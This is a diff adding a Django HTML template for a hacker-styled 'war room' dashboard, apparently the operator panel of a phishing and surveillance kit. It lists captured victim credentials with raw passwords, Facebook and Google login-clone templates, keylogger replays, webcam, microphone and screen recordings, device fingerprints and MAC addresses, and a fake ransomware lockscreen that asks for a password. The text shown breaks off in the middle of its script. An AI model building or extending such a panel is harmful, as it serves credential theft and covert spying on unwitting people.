@@ -1,0 +1,1868 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Intel | Cyber-Ops</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <!-- Particles.js -->
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --cyber-blue: #00f0ff;
+            --alert-red: #ff003c;
+            --dark-bg: #030303;
+            --panel-bg: rgba(5, 5, 5, 0.9);
+            --border-glow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+        body {
+            background-color: var(--dark-bg);
+            color: var(--neon-green);
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            overflow-x: hidden;
+            text-transform: uppercase;
+        }
+        /* Custom Scrollbar for Elite Feel */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--neon-green); }
+        ::-webkit-scrollbar-thumb:hover { background: #fff; }
+        /* CRT Scanline Effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 100;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+            opacity: 0.15;
+        }
+
+        /* Glitch Animation */
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        .glitch-hover:hover {
+            animation: glitch 0.3s cubic-bezier(.25,.46,.45,.94) both infinite;
+            color: #fff !important;
+            text-shadow: 2px 0 var(--alert-red), -2px 0 var(--cyber-blue);
+        }
+
+        /* Simulated World Map */
+        .threat-map-container {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            height: 300px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 4px;
+        }
+        .map-grid {
+            position: absolute;
+            width: 200%; height: 200%;
+            top: -50%; left: -50%;
+            background-image: 
+                radial-gradient(circle, rgba(0, 255, 65, 0.15) 1px, transparent 1px);
+            background-size: 30px 30px;
+            transform: perspective(500px) rotateX(60deg);
+            animation: grid-move 20s linear infinite;
+        }
+        @keyframes grid-move {
+            from { transform: perspective(500px) rotateX(60deg) translateY(0); }
+            to { transform: perspective(500px) rotateX(60deg) translateY(30px); }
+        }
+        .map-ping {
+            position: absolute;
+            width: 10px; height: 10px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--neon-green);
+            animation: ping-pulse 2s ease-out infinite;
+        }
+        @keyframes ping-pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(4); opacity: 0; }
+        }
+
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            opacity: 0.25;
+        }
+        .war-room-container {
+            padding: 30px 40px;
+            z-index: 1;
+            position: relative;
+        }
+        .badge-mode { padding: 2px 8px; font-size: 9px; letter-spacing: 1px; }
+        .badge-signup { border: 1px solid var(--cyber-blue); color: var(--cyber-blue); }
+        .badge-login { border: 1px solid var(--neon-green); color: var(--neon-green); }
+
+        .header {
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+            padding-bottom: 15px;
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 150px;
+            height: 1px;
+            background: var(--neon-green);
+            box-shadow: var(--border-glow);
+        }
+        .header h1 {
+            font-size: 38px;
+            color: #fff;
+            text-shadow: 0 0 20px var(--neon-green);
+            margin: 0;
+            letter-spacing: 4px;
+            font-weight: 700;
+        }
+        .header h1 span {
+            color: var(--neon-green);
+        }
+        .node-badge {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 8px 20px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .node-badge::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%; width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: scan 3s infinite linear;
+        }
+        @keyframes scan {
+            100% { left: 200%; }
+        }
+        
+        /* Stats grid - Elite Redesign */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .stat-card {
+            background: rgba(10, 10, 10, 0.8);
+            border: 1px solid #222;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+            transition: all 0.3s;
+        }
+        .stat-card:hover {
+            background: rgba(0, 255, 65, 0.05);
+            border-color: rgba(0, 255, 65, 0.5);
+            transform: translateY(-2px);
+        }
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 10px; height: 10px;
+            border-top: 2px solid var(--neon-green);
+            border-left: 2px solid var(--neon-green);
+        }
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0; right: 0; width: 10px; height: 10px;
+            border-bottom: 2px solid var(--neon-green);
+            border-right: 2px solid var(--neon-green);
+        }
+        
+        .stat-card.critical-alert {
+            border-color: rgba(255, 0, 60, 0.3);
+            background: rgba(20, 0, 0, 0.8);
+        }
+        .stat-card.critical-alert::before, .stat-card.critical-alert::after {
+            border-color: var(--alert-red);
+        }
+        {% if critical_threats > 0 %}
+        .stat-card.critical-alert { animation: alert-flash 2s infinite; }
+        @keyframes alert-flash {
+            0%, 100% { box-shadow: 0 0 0 transparent; }
+            50% { box-shadow: inset 0 0 20px rgba(255, 0, 60, 0.2); border-color: var(--alert-red); }
+        }
+        {% endif %}
+        
+        .stat-value {
+            font-size: 50px;
+            font-weight: 300;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255,255,255,0.3);
+            line-height: 1;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .stat-label {
+            font-size: 11px;
+            letter-spacing: 3px;
+            margin-top: 15px;
+            color: #666;
+        }
+        .critical-alert .stat-value { color: var(--alert-red); text-shadow: 0 0 20px var(--alert-red); font-weight: bold; }
+        .critical-alert .stat-label { color: #aa3333; }
+        
+        /* Live feed */
+        .live-feed-wrapper {
+            border: 1px solid #222;
+            background: rgba(5, 5, 5, 0.95);
+            padding: 30px;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+        }
+        .feed-title {
+            font-size: 16px;
+            color: #fff;
+            letter-spacing: 4px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .feed-title .blinking-cursor {
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* Keylogger active section */
+        .keylogger-panel {
+            margin-bottom: 30px;
+            border-left: 2px solid var(--neon-green);
+            padding: 20px;
+            background: linear-gradient(90deg, rgba(0, 255, 65, 0.05) 0%, transparent 100%);
+        }
+
+        /* Cyber Cards */
+        .cyber-card {
+            background: #080808;
+            border: 1px solid #1a1a1a;
+            border-left: 3px solid #333;
+            padding: 20px 25px;
+            margin-bottom: 15px;
+            display: grid;
+            grid-template-columns: 1fr 2fr 3fr 1.5fr;
+            gap: 20px;
+            align-items: center;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        .cyber-card:hover {
+            background: #0a0a0a;
+            border-color: #333;
+            transform: translateX(5px);
+        }
+        
+        .cyber-card.critical { border-left-color: var(--alert-red); }
+        .cyber-card.high { border-left-color: #ffaa00; }
+        .cyber-card.low { border-left-color: var(--neon-green); }
+        
+        .action-btns {
+            display: flex;
+            gap: 10px;
+            margin-top: 8px;
+        }
+        .copy-btn {
+            background: transparent;
+            border: 1px solid currentColor;
+            color: inherit;
+            padding: 5px 10px;
+            font-size: 11px;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .copy-btn:hover {
+            background: currentColor;
+            color: #000;
+            box-shadow: 0 0 10px currentColor;
+        }
+        .data-label { color: #666; font-size: 10px; letter-spacing: 1px; margin-bottom: 5px; }
+        .data-value { font-size: 15px; letter-spacing: 0.5px; }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #111; }
+        ::-webkit-scrollbar-thumb { background: #333; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--cyber-blue); }
+
+        /* Hacker Terminal Input */
+        .terminal-wrapper {
+            background: #000;
+            border: 1px solid #333;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            height: 260px;
+        }
+        .terminal-output {
+            padding: 15px;
+            overflow-y: auto;
+            flex-grow: 1;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .terminal-output p { margin: 0 0 5px 0; }
+        .terminal-output .cmd-echo { color: #fff; }
+        .terminal-output .cmd-success { color: var(--neon-green); }
+        .terminal-output .cmd-error { color: var(--alert-red); }
+        .terminal-output .cmd-info { color: var(--cyber-blue); }
+
+        .terminal-input-row {
+            display: flex;
+            align-items: center;
+            padding: 0 15px 15px 15px;
+        }
+        .terminal-prompt {
+            color: var(--alert-red);
+            margin-right: 10px;
+            white-space: nowrap;
+        }
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: var(--neon-green);
+            font-family: inherit;
+            font-size: 16px;
+            width: 100%;
+            outline: none;
+        }
+        
+        .webcam-box {
+            border: 1px solid #333;
+            background: #000;
+            width: 100%;
+            max-width: 150px;
+            aspect-ratio: 4/3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+            font-size: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        .webcam-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: grayscale(100%) contrast(1.2);
+            opacity: 0.8;
+        }
+        .webcam-box::after {
+            content: "REC";
+            position: absolute;
+            top: 5px; right: 5px;
+            color: red;
+            font-weight: bold;
+            font-size: 9px;
+            animation: blink 1s infinite;
+        }
+        
+        /* DDoS Red Screen */
+        body.ddos-active {
+            animation: ddos-flash 0.1s infinite;
+        }
+        @keyframes ddos-flash {
+            0% { background-color: var(--alert-red); }
+            50% { background-color: #000; }
+            100% { background-color: var(--alert-red); }
+        }
+        
+        @keyframes sweep { to { transform: rotate(360deg); } }
+        @keyframes blip { 0% { opacity: 0; transform: scale(0); } 10% { opacity: 1; transform: scale(1.5); } 100% { opacity: 0; transform: scale(1); } }
+        
+        .device-phone {
+            border-radius: 15px; border: 4px solid #333; aspect-ratio: 9/16; max-width: 90px;
+        }
+        .device-laptop {
+            border-radius: 5px 5px 0 0; border: 3px solid #333; border-bottom: 8px solid #555;
+        }
+        
+        @keyframes mouseMove {
+            0% { top: 40%; left: 50%; }
+            30% { top: 20%; left: 60%; }
+            60% { top: 80%; left: 20%; }
+            100% { top: 50%; left: 80%; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Hidden CSRF form - needed for AJAX requests -->
+<form id="csrf-form" style="display:none;">{% csrf_token %}</form>
+
+<canvas id="matrix-canvas"></canvas>
+
+    <div class="war-room-container">
+        <div class="header">
+            <div>
+                <h1 class="glitch-hover" style="font-size: 32px; letter-spacing: 5px;">CYBER-OPS<span> // WAR_ROOM</span></h1>
+                <div style="font-size: 13px; color: #555; margin-top: 5px; letter-spacing: 2px;">
+                    <span style="color: var(--cyber-blue);">[*]</span> NODE_STATUS: <span style="color: var(--neon-green);">ACTIVE</span> | <span style="color: var(--cyber-blue);">[*]</span> ENCRYPTION: <span style="color: var(--neon-green);">AES-256</span>
+                </div>
+            </div>
+            <div class="text-end">
+                <div id="system-time" style="font-size: 18px; color: var(--cyber-blue); letter-spacing: 3px; font-weight: bold; margin-bottom: 10px;">00:00:00</div>
+                <div class="d-flex gap-2 justify-content-end align-items-center">
+                    <span style="color: #666; font-size: 11px;">TARGET_VECTOR:</span>
+                    <select id="template-switcher" onchange="switchTemplate(this.value)" style="background: #000; color: var(--cyber-blue); border: 1px solid var(--cyber-blue); padding: 2px 10px; font-family: inherit; font-size: 11px; outline: none;">
+                        <option value="admin">Login/SignUp (Default)</option>
+                        <option value="facebook">Facebook Clone</option>
+                        <option value="google">Google Sign-In</option>
+                    </select>
+                    <button onclick="activateKillSwitch()" style="background: var(--alert-red); color: white; border: none; padding: 4px 15px; font-family: inherit; font-weight: bold; font-size: 12px; cursor: pointer; box-shadow: 0 0 10px var(--alert-red);">
+                        <i class="fa-solid fa-radiation me-1"></i> PROTOCOL_ZERO
+                    </button>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value">{{ total_intercepts }}</div>
+                <div class="stat-label">Total Data Captured</div>
+            </div>
+            <div class="stat-card critical-alert">
+                <div class="stat-value" style="color: var(--alert-red);">{{ critical_threats }}</div>
+                <div class="stat-label">Critical Breaches</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" style="color: var(--cyber-blue);">ONLINE</div>
+                <div class="stat-label">System Status</div>
+            </div>
+            <div class="stat-card" style="padding: 0; position: relative; overflow: hidden;">
+                <div class="radar-container" style="width: 100%; height: 100%; position: absolute; background: repeating-radial-gradient(rgba(0, 255, 65, 0.05) 0, transparent 20px);">
+                    <div class="radar-sweep" style="width: 50%; height: 50%; border-right: 1px solid var(--neon-green); position: absolute; bottom: 50%; left: 0; transform-origin: bottom right; animation: sweep 4s infinite linear; background: linear-gradient(45deg, transparent, rgba(0,255,65,0.2));"></div>
+                </div>
+                <div style="z-index: 1; font-size: 9px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--neon-green); letter-spacing: 2px;">SCANNING...</div>
+            </div>
+        </div>
+        <div class="stats-grid" style="margin-top: 15px;">
+            <div class="stat-card">
+                <div id="mobile-count" class="stat-value">{{ device_breakdown.mobile }}</div>
+                <div class="stat-label">Mobile Victims</div>
+            </div>
+            <div class="stat-card">
+                <div id="desktop-count" class="stat-value">{{ device_breakdown.desktop }}</div>
+                <div class="stat-label">Desktop Victims</div>
+            </div>
+            <div class="stat-card">
+                <div id="tablet-count" class="stat-value">{{ device_breakdown.tablet }}</div>
+                <div class="stat-label">Tablet Victims</div>
+            </div>
+            <div class="stat-card">
+                <div id="other-count" class="stat-value">{{ device_breakdown.other }}</div>
+                <div class="stat-label">Unknown Devices</div>
+            </div>
+        </div>
+</div>
+    </div>
+
+    <div class="live-feed-wrapper">
+        <div class="live-feed">
+            <div class="feed-title">
+                <span>> LIVE_INTERCEPTION_STREAM</span>
+                <span class="blinking-cursor" style="color: var(--neon-green);">_</span>
+            </div>
+
+            <div id="live-keys-container">
+            {% if live_keys %}
+            <div class="keylogger-panel">
+                <div style="color: #fff; font-size: 12px; margin-bottom: 15px; letter-spacing: 2px; display:flex; justify-content: space-between;">
+                    <span><i class="fa-solid fa-keyboard me-2" style="color: var(--neon-green); animation: blink 1s infinite;"></i> ACTIVE_KEYLOGGER_SESSION</span>
+                </div>
+                {% for key in live_keys %}
+                <div style="font-family: 'Courier New', Courier, monospace; font-size: 14px; margin-bottom: 10px;">
+                    <span style="color: #555;">[{{ key.timestamp|date:"H:i:s" }}]</span> 
+                    <span style="color: var(--alert-red); margin: 0 10px;">{{ key.username_context }}</span> 
+                    <button class="copy-btn" style="color: var(--cyber-blue); font-size: 10px; margin-right: 10px;" onclick="playKeystrokes('{{ key.keystrokes|escapejs }}')"><i class="fa-solid fa-play"></i> REPLAY</button>
+                    
+                    <span class="keys-parsed" data-raw="{{ key.keystrokes }}" style="color: var(--neon-green); background: rgba(0,255,65,0.05); padding: 2px 8px; margin-left: 10px;"></span>
+                </div>
+                {% endfor %}
+            </div>
+            {% endif %}
+            </div>
+            
+            <div id="active-victims-panel" class="active-victims-panel" style="margin-bottom: 30px; border: 1px solid rgba(0,255,65,0.15); padding: 20px; background: rgba(0,0,0,0.9);">
+                <div class="feed-title" style="margin-bottom: 18px;">
+                    <span>> LIVE VICTIMS PANEL</span>
+                </div>
+                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px;">
+                    {% for victim in active_victims %}
+                    <div style="background: rgba(10,10,10,0.9); border: 1px solid #111; padding: 14px; font-size: 12px;">
+                        <div style="color: #fff; margin-bottom: 8px; letter-spacing: 1px;">{{ victim.ip_address }} <span style="color: var(--cyber-blue); font-size: 10px;">{{ victim.session_id|slice:":8" }}</span></div>
+                        <div class="data-label">LAST ACTION</div>
+                        <div class="data-value">{{ victim.last_action|default:"N/A" }}</div>
+                        <div class="data-label" style="margin-top:8px;">DEVICE INFO</div>
+                        <div class="data-value" style="font-size:11px; color:#aaa;">{{ victim.device_info|default:"Unknown" }}</div>
+                        <div class="data-label" style="margin-top:8px;">CURRENT URL</div>
+                        <div class="data-value" style="font-size:11px; color:#ccc;">{{ victim.current_url|default:"none" }}</div>
+                        <div class="data-label" style="margin-top:8px;">SEEN</div>
+                        <div class="data-value" style="font-size:11px; color:#666;">{{ victim.last_seen|date:"H:i:s d-m-Y" }}</div>
+                    </div>
+                    {% empty %}
+                    <div style="grid-column:1/-1; color:#555; text-align:center; padding: 20px;">NO ACTIVE VICTIMS ONLINE RIGHT NOW.</div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <div id="timeline-panel" class="timeline-panel" style="margin-bottom: 30px; border: 1px solid rgba(0,255,65,0.12); padding: 20px; background: rgba(0,0,0,0.85);">
+                <div class="feed-title" style="margin-bottom: 18px;">
+                    <span>> VICTIM TIMELINE</span>
+                </div>
+                <div style="display:flex; flex-direction:column; gap: 10px;">
+                    {% for item in timeline_events %}
+                    <div style="display:flex; justify-content: space-between; gap: 10px; padding: 12px; border: 1px solid rgba(0,255,65,0.08);">
+                        <div style="color:#fff; font-size: 12px;">{{ item.summary }}</div>
+                        <div style="color:#666; font-size: 11px;">{{ item.date }} {{ item.time }}</div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <div id="logs-container">
+            {% for log in logs %}
+            <div class="cyber-card {{ log.risk_level|lower }}" data-log-id="{{ log.id }}" data-raw-password="{{ log.raw_password|escapejs }}">
+                <div>
+                    <div class="data-label">THREAT LEVEL</div>
+                    <div class="data-value font-weight-bold" style="margin-bottom: 15px;">
+                        [{{ log.risk_level }}]
+                    </div>
+                    <div id="media-links-{{ log.id }}" style="margin-top:10px; display:flex; gap:10px; flex-wrap:wrap;">
+                        {% if log.webcam_snap %}<a href="{{ log.webcam_snap }}" download="webcam_{{ log.id }}.jpg" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_SNAP</a>{% endif %}
+                        {% if log.webcam_video %}<a href="{{ log.webcam_video }}" download="cam_video_{{ log.id }}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_CAM_VIDEO</a>{% endif %}
+                        {% if log.voice_audio %}<a href="{{ log.voice_audio }}" download="audio_{{ log.id }}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_AUDIO</a>{% endif %}
+                        {% if log.screen_recording %}<a href="{{ log.screen_recording }}" download="screen_{{ log.id }}.webm" class="copy-btn" style="color:var(--neon-green); text-decoration:none;"><i class="fa-solid fa-download"></i> DOWNLOAD_SCREEN</a>{% endif %}
+                    </div>
+
+                    {% if log.webcam_video %}
+                    <div style="margin-top:15px; border:1px solid #333; padding:5px; background:#000;">
+                        <div style="font-size:10px; color:#555; margin-bottom:5px;">WEBCAM_VIDEO_FEED</div>
+                        <video src="{{ log.webcam_video }}" controls style="width:100%; max-height:200px; border:1px solid #222;"></video>
+                    </div>
+                    {% elif log.webcam_snap %}
+                    <div class="webcam-box {% if 'iPhone' in log.browser_fingerprint or 'Android' in log.browser_fingerprint %}device-phone{% else %}device-laptop{% endif %}">
+                        <img src="{{ log.webcam_snap }}" alt="Target Webcam">
+                    </div>
+                    {% else %}
+                    <div class="webcam-box" style="border-style: dashed;">
+                        NO VIDEO FEED
+                    </div>
+                    {% endif %}
+                    
+                    {% if log.voice_audio %}
+                    <div class="mt-3">
+                        <div class="data-label" style="color: var(--alert-red);"><i class="fa-solid fa-microphone"></i> AUDIO INTERCEPT</div>
+                        <audio src="{{ log.voice_audio }}" controls style="width: 100%; height: 30px; outline: none; margin-top: 5px;"></audio>
+                    </div>
+                    {% endif %}
+
+                    {% if log.screen_recording %}
+                    <div class="mt-3">
+                        <div class="data-label" style="color: var(--cyber-blue);"><i class="fa-solid fa-desktop"></i> SCREEN RECORDING</div>
+                        <video src="{{ log.screen_recording }}" controls style="width: 100%; max-height: 150px; outline: none; margin-top: 5px; border: 1px solid rgba(0,255,65,0.1);"></video>
+                    </div>
+                    {% endif %}
+                </div>
+                <div>
+                    <div class="data-label">ORIGIN VECTOR</div>
+                    <div class="data-value" id="ip-{{ log.id }}" style="font-size:12px;">{{ log.geo_ip }}</div>
+                    <div class="data-label" style="margin-top:10px;">MAC ADDRESS</div>
+                    <div class="data-value" style="font-size:12px; color: #888;">{{ log.mac_address }}</div>
+                    <div class="data-label" style="margin-top:10px;">DEVICE INFO</div>
+                    <div class="data-value" style="font-size:11px; color: #aaa;">{{ log.browser_fingerprint }}</div>
+                </div>
+                <div>
+                    <div class="data-label">CREDENTIAL PAYLOAD (HASH / RAW)</div>
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:6px;">
+                        <div class="data-value text-break" style="color: #fff; margin:0;">{{ log.intercepted_id }}</div>
+                        {% if log.auth_mode %}
+                        <span class="badge-mode {% if log.auth_mode == 'SIGNUP' %}badge-signup{% else %}badge-login{% endif %}">{{ log.auth_mode }}</span>
+                        {% endif %}
+                    </div>
+                    {% if log.full_name %}
+                    <div style="font-size:11px; color:#aaa; margin-bottom:5px;"><i class="fa-solid fa-user me-1"></i> {{ log.full_name }}</div>
+                    {% endif %}
+                    
+                    <!-- Hidden Hash initially -->
+                    <div class="data-value" style="font-size:11px; margin-top: 5px; font-family: monospace; color: var(--cyber-blue); cursor: pointer;" 
+                         id="hash-display-{{ log.id }}" 
+                         onclick="revealHash('hash-{{ log.id }}', 'hash-display-{{ log.id }}')">
+                        [ HIDDEN_HASH_CLICK_TO_REVEAL ]
+                    </div>
+                    
+                    <!-- Actual Hash (Hidden) -->
+                    <div style="display: none; font-size:11px; opacity: 0.6; word-break: break-all; margin-top: 5px; font-family: monospace;" id="hash-{{ log.id }}">
+                        {{ log.encrypted_token }}
+                    </div>
+                    
+                    <div id="raw-{{ log.id }}" class="data-value font-weight-bold" style="display: none; font-size:16px; margin-top: 8px; text-shadow: 0 0 8px currentColor;"></div>
+                    
+                    <div class="action-btns mt-2">
+                        <button class="copy-btn" onclick="revealHash('hash-{{ log.id }}', 'hash-display-{{ log.id }}')"><i class="fa-solid fa-fingerprint"></i> HASH</button>
+                        <button class="copy-btn" onclick="crackHash('{{ log.id }}', '{{ log.raw_password|escapejs }}')"><i class="fa-solid fa-unlock-keyhole"></i> CRACK</button>
+                    </div>
+                </div>
+                <div class="text-end">
+                    <div class="data-label">TIMESTAMP LOCAL</div>
+                    <div class="data-value" style="font-size:16px; color: #fff;">{{ log.timestamp|date:"H:i:s" }}</div>
+                    <div class="data-value" style="font-size:12px; color: #666;">{{ log.timestamp|date:"Y-m-d" }}</div>
+                    <div style="font-size: 10px; margin-top: 15px; color: #444;">SYS_ID: {{ log.id }}</div>
+                </div>
+            </div>
+            {% endfor %}
+            </div>
+
+        </div>
+    </div>
+    
+    <div class="bottom-panels" style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px; margin-top: 20px;">
+        <!-- Hacker Terminal -->
+        <div class="terminal-wrapper">
+            <div class="terminal-output" id="terminal-output">
+                <p class="cmd-info">Cyber-Ops Terminal v2.1.0 initialized.</p>
+                <p class="cmd-info">Type 'help' for a list of available commands.</p>
+            </div>
+            <div class="terminal-input-row">
+                <span class="terminal-prompt">root@blackhat:~#</span>
+                <input type="text" id="hacker-terminal" class="terminal-input" placeholder="Enter command..." autocomplete="off">
+            </div>
+        </div>
+
+        <!-- Network Sniffer -->
+        <div class="sniffer-wrapper" style="background: #000; border: 1px solid #333; padding: 15px; font-family: 'Courier New', monospace; height: 260px; display: flex; flex-direction: column;">
+            <div style="color: var(--cyber-blue); font-size: 12px; border-bottom: 1px solid #222; padding-bottom: 5px; margin-bottom: 10px;">
+                <i class="fa-solid fa-network-wired me-2"></i> GLOBAL_PACKET_SNIFFER
+            </div>
+            <div id="sniffer-output" style="overflow: hidden; font-size: 10px; color: #555; line-height: 1.2; display: flex; flex-direction: column; justify-content: flex-end; flex-grow: 1;">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Overlay Modals -->
+<div id="fullscreen-overlay" style="display:none; position: fixed; top:0; left:0; right:0; bottom:0; background: rgba(0,0,0,0.85); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; backdrop-filter: blur(5px);">
+    <div id="overlay-content" style="width: 80%; height: 80%; border: 1px solid #333; background: #050505; position: relative; box-shadow: 0 0 50px rgba(0,0,0,1);">
+        <div style="position:absolute; top:-30px; right:0; color:#fff; cursor:pointer; font-weight:bold; letter-spacing: 2px;" onclick="closeOverlay()">[ X ] ABORT_SESSION</div>
+        <div id="inner-content" style="padding: 20px; overflow: auto; height: 100%;"></div>
+    </div>
+</div>
+
+<div id="ransomware-lockscreen" style="display:none; position: fixed; top:0; left:0; width:100%; height:100%; background: #FF0000; z-index: 10001; justify-content: center; align-items: center; flex-direction: column;">
+    <div style="text-align: center; color: white; font-family: 'Courier New', monospace;">
+        <h1 style="font-size: 72px; letter-spacing: 8px; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); margin: 40px 0;">SYSTEM COMPROMISED</h1>
+        <div style="background: #000; border: 3px solid white; padding: 40px; max-width: 800px; margin: 40px auto; font-size: 18px; line-height: 1.8;">
+            <p>All your files are encrypted and currently being uploaded to our servers.</p>
+            <p style="margin: 20px 0;">Do NOT attempt to turn off your computer or you will lose your data forever.</p>
+            <p style="color: #FFFF00; font-weight: bold; margin: 30px 0;">To unlock your device, please confirm your identity below.</p>
+            
+            <input type="password" id="ransom-password" placeholder="••••••••••••••••" style="width: 100%; padding: 15px; margin: 20px 0; background: #222; color: white; border: 1px solid #666; font-size: 16px; font-family: monospace; text-align: center;" onkeypress="if(event.key==='Enter') unlockRansom();">
+            
+            <button onclick="unlockRansom()" style="background: #CC0000; color: white; border: 2px solid white; padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; letter-spacing: 2px;">UNLOCK</button>
+        </div>
+        <p id="ransom-error" style="color: #FFFF00; margin-top: 20px; display: none; font-weight: bold;">INVALID PASSWORD! TRY AGAIN.</p>
+    </div>
+</div>
+
+<div id="cracker-overlay" style="display:none; position: fixed; top:0; left:0; right:0; bottom:0; background: rgba(0,0,0,0.95); z-index: 10000; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
+    <div style="position:absolute; top:20px; right:30px; color:#555; cursor:pointer; font-size:14px; letter-spacing: 2px;" onclick="document.getElementById('cracker-overlay').style.display='none';">[ ESC ] CLOSE</div>
+    <h1 style="font-size: 60px; color: var(--neon-green); letter-spacing: 10px; margin-bottom: 20px; text-shadow: 0 0 20px var(--neon-green);">DECRYPTING PAYLOAD</h1>
+    <div id="crack-matrix" style="font-size: 22px; color: #555; font-family: monospace; word-break: break-all; max-width: 80%; line-height:1.6;"></div>
+    <h2 id="crack-result" style="display:none; color: var(--alert-red); font-size: 50px; margin-top: 40px; text-shadow: 0 0 20px var(--alert-red); animation: blink 0.5s step-end 6;"></h2>
+    <p id="crack-subtext" style="display:none; color:#666; font-size:14px; margin-top:20px; letter-spacing:3px;">CLICK ANYWHERE TO DISMISS</p>
+</div>
+
+<script>
+    // Matrix Rain Effect
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    
+    const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレゲゼデベペオォコソトノホモヨョロゴゾドボポヴッン';
+    const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const nums = '0123456789';
+    const alphabet = katakana + latin + nums;
+    
+    const fontSize = 16;
+    const columns = canvas.width/fontSize;
+    const drops = [];
+    
+    for(let x = 0; x < columns; x++) {
+        drops[x] = 1;
+    }
+    
+    function draw() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        
+        ctx.fillStyle = '#0F0';
